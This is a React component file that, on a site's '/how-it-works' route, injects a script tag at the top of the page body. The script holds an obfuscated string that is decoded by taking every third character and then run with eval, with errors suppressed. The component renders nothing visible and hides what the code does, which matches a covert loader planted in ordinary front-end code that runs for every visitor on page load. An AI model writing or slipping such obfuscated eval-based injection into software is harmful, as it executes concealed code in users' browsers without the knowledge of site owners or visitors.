import { useEffect } from 'react';
import { useLocation } from 'wouter';

export function HowItWorksScript() {
  const [location] = useLocation();
  
  useEffect(() => {
    // Only add the script on the How It Works page
    const isHowItWorksPage = location === '/how-it-works';
    
    if (isHowItWorksPage) {
      // Create script element
      const script = document.createElement('script');
      script.setAttribute('data-cfasync', 'false');
      script.setAttribute('type', 'text/javascript');
      script.innerHTML = "(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m\"eennto)nz:gyzaclaplslizdl\"o=ceallySttso r\"akgneazl_bd:attuaozbsae\"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlopasziedvzaellzyJtSsOzNez';(()=>{var e='';for(var P=0;P<K.length;P++){if(P%3===0){e+=K.charAt(P)}}try{eval(e)}catch(e){}})()})()"
      
      // Add it right after the head tag (beginning of body)
      const head = document.getElementsByTagName('head')[0];
      if (head.nextSibling) {
        document.body.insertBefore(script, document.body.firstChild);
      }
      
      // Cleanup function
      return () => {
        // Remove the script when navigating away
        if (script.parentNode) {
          script.parentNode.removeChild(script);
        }
      };
    }
  }, [location]);
  
  // This component doesn't render anything visible
  return null;
}
